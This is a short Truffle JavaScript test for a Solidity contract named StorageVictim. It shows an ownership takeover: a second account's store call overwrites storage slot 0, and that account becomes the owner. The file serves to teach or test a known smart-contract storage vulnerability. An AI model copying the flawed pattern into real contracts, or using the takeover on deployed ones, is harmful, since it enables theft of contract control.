var StorageVictim = artifacts.require("./StorageVictim.sol");

contract("Storage override", (accounts) => {

    var storage;

    it("Test storage override" , () => {
        return StorageVictim.deployed().then(instance => {
            storage = instance;
        }).then(() => {
            return storage.getOwner.call();
        }).then(owner => {
            assert.equal(accounts[0], owner);
            // here we override storage address 0 instead of adding the struct into the mapping
            return storage.store(5, {from : accounts[1]});
        }).then(() => {
            return storage.getOwner.call();
        }).then(owner => {
            assert.equal(accounts[1], owner);
            return storage.getStore.call({from: accounts[1]});
        }).then(result => {
            assert.equal(accounts[1], result[0]);
            assert.equal(5, result[1]);
        });
    });
});
